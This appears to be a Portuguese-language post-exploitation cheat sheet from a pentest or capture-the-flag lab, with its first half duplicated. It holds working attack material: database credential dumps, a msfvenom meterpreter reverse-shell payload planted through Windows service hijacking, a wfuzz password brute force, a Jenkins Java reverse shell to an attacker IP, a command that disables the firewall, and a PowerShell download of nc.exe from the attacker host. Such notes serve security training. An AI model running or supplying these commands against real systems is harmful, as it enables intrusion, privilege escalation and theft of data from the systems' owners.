# posexploracao
Lista de comandos relacionados a pentest

sqlite3
.tables
select * from Users


rbscheat -i 172.16.1000.11:2223 -l bash

echo "select * from mysql.user;" | mysql -h 127.0.0.1 -uwordpress -pskade 

echo "select * from wordpress.wp_users;" | mysql -h 127.0.0.1 -uwordpress -pskade 

export TERM=xterm

sudo base64 /root/flag.txt | base64 -d

acesschk.exe -uqmv .\tyranus-op 

sc config raxus-service obj=".\LocalSystem"

msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.100.210 lport=443 -f exe -o invasao.exe
sc config raxus-service binpath="C:\users\tyranus-op\invasao.exe"

service postgresql start

use multi/handler

set AutorunScript post/windows/manager/migrate/

# posexploracao
Lista de comandos relacionados a pentest

sqlite3
.tables
select * from Users


rbscheat -i 172.16.1000.11:2223 -l bash

echo "select * from mysql.user;" | mysql -h 127.0.0.1 -uwordpress -pskade 

echo "select * from wordpress.wp_users;" | mysql -h 127.0.0.1 -uwordpress -pskade 

export TERM=xterm

sudo base64 /root/flag.txt | base64 -d

acesschk.exe -uqmv .\tyranus-op 

sc config raxus-service obj=".\LocalSystem"

msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.100.210 lport=443 -f exe -o invasao.exe
sc config raxus-service binpath="C:\users\tyranus-op\invasao.exe"

service postgresql start

use multi/handler

set AutorunScript post/windows/manager/migrate/


wfuzz -c -z file,/usr/share/seclists/Passwords/Common-Credentials/best1050.txt --hs incorreta -d "x1_login=admin&x2_senha=FUZZ&entrar=Enviar" http://metasploitable.XXX/login/index.php 

JENKINS:



String host="172.16.100.210";
int port=8044;
String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();


   def command = "cmd.exe /c netsh advfirewall set allprofile state off"
   def proc = command.execute()
   proc.waitFor()

   println "Process exit code: ${proc.exitValue()}"
   println "Std Err: ${proc.err.text}"
   println "Std Out: ${proc.in.text}"
   
   ------------




powershell 2
   
$url = "http://172.16.100.210/nc.exe" 
$path = "nc.exe" 
if(!(Split-Path -parent $path) -or !(Test-Path -pathType Container (Split-Path -parent $path))) { 
$targetFile = Join-Path $pwd (Split-Path -leaf $path) 
} 
(New-Object Net.WebClient).DownloadFile($url, $path) 
$path




